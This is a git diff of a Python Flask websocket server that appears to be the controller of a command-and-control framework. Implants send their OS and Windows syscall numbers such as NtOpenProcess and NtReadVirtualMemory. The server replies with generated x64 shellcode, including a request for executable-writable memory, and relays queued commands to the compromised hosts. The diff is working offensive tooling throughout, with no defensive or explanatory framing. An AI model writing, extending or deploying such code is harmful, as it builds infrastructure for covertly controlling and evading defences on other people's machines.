@@ -6,11 +6,11 @@ from app import anon_bp
 from flask_jwt_extended.exceptions import JWTExtendedException
 from routes.auth.sudo.system import sock
 from models.agent import Agent
-from models.shell import Shell
 from models.line import Line
 from models.syscall import Syscall
-from services.binary import generate_x64_push_syscall
+from services.binary import push_syscall, allocmem
 import logging
+import struct
 logger = logging.getLogger(__name__)
 
 bp = Blueprint("agent", __name__, url_prefix='/agent')
@@ -19,101 +19,88 @@ from flask import request, current_app
 import threading
 import time
 
-def save_syscalls_bytes(agent_id, data: bytes):
-    """
-    Takes a string in the format:
-        APINAME:SyscallNumber,APINAME:SyscallNumber,...
 
-    Example:
-        NtOpenProcess:38,NtClose:15,NtReadVirtualMemory:63
-    """
-    if not data:
-        raise ValueError("Input string is empty")
-    value = data.decode()
-    created = []
 
-    for item in value.split(","):
-        item = item.strip()
-        if not item:
-            continue
+def parse_handshake(msg, agent_id):
+    ip = request.remote_addr
+    if msg is None:
+        raise ValueError("empty handshake")
 
-        if ":" not in item:
-            raise ValueError(f"Invalid entry: {item}")
+    # Normalize handshake to bytes
+    if isinstance(msg, str):
+        msg = msg.encode("utf-8")
 
-        name, syscall_str = item.split(":", 1)
-        name = name.strip()
-        syscall_str = syscall_str.strip()
+    if not isinstance(msg, (bytes, bytearray)):
+        raise TypeError(f"unexpected handshake type: {type(msg)!r}")
 
-        if not name:
-            raise ValueError(f"Missing API name in entry: {item}")
+    msg = bytes(msg)
+    parts = msg.split(b';')
+    os_bytes = parts[0]
+    scratchpad = parts[1]
+    syscall_blob = parts[2]
+    agent = Agent.by_id(agent_id)
+    os_name = os_bytes.decode("utf-8", errors="replace")
+    agent.os = os_name
+    agent.scratchpad = scratchpad
+    agent.save()
+    print(f"New agent os = {os_name}, scratchpad = {scratchpad}")
+    Syscall.save_syscalls_bytes(agent.id, syscall_blob)
 
-        try:
-            syscall_number = int(syscall_str)
-        except ValueError:
-            raise ValueError(f"Invalid syscall number in entry: {item}")
+def handle_msg_type(msg, agent_id):
+    if not msg:
+        return
 
-        syscall_obj = Syscall(agent_id, name, syscall_number)
-        syscall_obj.save()
+    msg_type = msg[0]
+    payload = msg[1:]
 
-    return created
+    if msg_type == 0x00:
+        # handshake
+        parse_handshake(msg, agent_id)
+        retparams, shellcode = allocmem(agent_id, 0x1000, 0x40)
+        to_send = bytearray()
+        to_send.extend(b'\x00')
+        print(len(shellcode))
+        to_send.extend(struct.pack('<Q', int(len(shellcode))))
+        to_send.extend(shellcode)
+        for retparam in retparams:
+            to_send.extend(struct.pack('<Q', retparam))
+        print(to_send.hex())
+        line = Line.create_for_agent(
+            agent_id=agent_id,
+            content=to_send,
+            incoming=False
+        )
+        line.save()
+
+
+        
+
+    elif msg_type == 0x01:
+        # returned message
+        line = Line.create_for_agent(
+            agent_id=agent_id,
+            content=payload,
+            incoming=True
+        )
+        line.save()
+
+    else:
+        # unknown message type
+        line = Line.create_for_agent(
+            agent_id=agent_id,
+            content=f"[unknown msg type 0x{msg_type:02x}] {payload!r}",
+            incoming=True
+        )
+        line.save()
+
 
 @sock.route(f"{anon_bp.url_prefix}{bp.url_prefix}/ws/<agent_id>")
 def server_agent_ws(ws, agent_id):
-    print("Starting shell...")
-
-    try:
-        msg = ws.receive(timeout=5)
-        ip = request.remote_addr
-
-        if msg is None:
-            raise ValueError("empty handshake")
-
-        # Normalize handshake to bytes
-        if isinstance(msg, str):
-            msg = msg.encode("utf-8")
-
-        if not isinstance(msg, (bytes, bytearray)):
-            raise TypeError(f"unexpected handshake type: {type(msg)!r}")
-
-        msg = bytes(msg)
-
-        # Handshake format:
-        # [0:36]   -> shell_id (ascii/utf-8)
-        # [36:pos] -> os (ascii/utf-8)
-        # [pos+1:] -> raw syscall blob
-        shell_id_bytes = msg[:36]
-        pos = msg.find(b";", 36)
-        if pos == -1:
-            raise ValueError("invalid handshake: missing separator")
-
-        os_bytes = msg[36:pos]
-        syscall_blob = msg[pos + 1:]
-
-        shell_id = shell_id_bytes.decode("utf-8", errors="strict")
-        os_name = os_bytes.decode("utf-8", errors="replace")
-
-        print(f"Creating agent with id {agent_id} and os {os_name}")
-        new_agent = Agent(agent_id, ip, os_name, "admin")
-        new_agent.save()
-
-        new_shell = Shell(shell_id, agent_id)
-        print(f"Creating shell with id {shell_id}")
-        new_shell.save()
-
-        # This function should accept bytes now
-        save_syscalls_bytes(agent_id, syscall_blob)
-
-        sys_number = Syscall.sys(agent_id, "ZwClose")
-        shellcode = generate_x64_push_syscall(sys_number, [0])
-
-        # Ensure binary websocket frame
-        ws.send(shellcode)
-
-    except Exception:
-        logger.info("No handshake received.", exc_info=True)
-        ws.send(b"[auth] no handshake received\n")
-        ws.close()
-        return
+    print(f"Requesting shell for agent {agent_id}...")
+    agent = Agent.by_id(agent_id)
+    if agent is None:
+        agent = Agent(agent_id, "admin")
+        agent.save()
 
     app = current_app._get_current_object()
     stop_event = threading.Event()
@@ -124,7 +111,7 @@ def server_agent_ws(ws, agent_id):
         with app.app_context():
             while not stop_event.is_set():
                 try:
-                    lines = Line.by_shell_outgoing_after(shell_id, last_sent_id)
+                    lines = Line.by_agent_outgoing_after(agent_id, last_sent_id)
 
                     for line in lines:
                         last_sent_id = line.id
@@ -137,7 +124,7 @@ def server_agent_ws(ws, agent_id):
                             data = bytes(data)
 
                         print(
-                            f"Sending to agent {agent_id} and shell {shell_id}: "
+                            f"Sending to agent {agent_id}: "
                             f"{len(data)} bytes"
                         )
 
@@ -150,7 +137,7 @@ def server_agent_ws(ws, agent_id):
                     time.sleep(1)
 
                 except Exception:
-                    logger.exception("Failed polling outgoing lines for shell %s", shell_id)
+                    logger.exception("Failed polling outgoing lines for agent %s", agent_id)
                     stop_event.set()
 
     poll_thread = threading.Thread(target=poll_outgoing, daemon=True)
@@ -162,11 +149,11 @@ def server_agent_ws(ws, agent_id):
                 message = ws.receive()
                 print(f"Received message {message}")
             except Exception:
-                logger.info("WebSocket receive failed/closed for shell %s", shell_id)
+                logger.info("WebSocket receive failed/closed for agent %s", agent.id)
                 break
 
             if message is None:
-                logger.info("WebSocket closed for shell %s", shell_id)
+                logger.info("WebSocket closed for agent %s", agent.id)
                 break
 
             # Normalize everything to bytes
@@ -177,8 +164,8 @@ def server_agent_ws(ws, agent_id):
 
             if not isinstance(message, bytes):
                 logger.warning(
-                    "Unexpected websocket message type for shell %s: %r",
-                    shell_id,
+                    "Unexpected websocket message type for agent %s: %r",
+                    agent.id,
                     type(message),
                 )
                 continue
@@ -188,19 +175,14 @@ def server_agent_ws(ws, agent_id):
 
             with app.app_context():
                 print(
-                    f"Received from agent {agent_id} and shell {shell_id}: "
+                    f"Received from agent {agent_id}: "
                     f"{len(message)} bytes"
                 )
-                line = Line.create_for_shell(
-                    shell_id=shell_id,
-                    content=message,
-                    incoming=True
-                )
-                line.save()
-
+                handle_msg_type(message, agent.id)
     finally:
         stop_event.set()
-        new_shell.delete()
+        if agent is not None:
+            agent.online = False
         try:
             ws.close()
         except Exception:
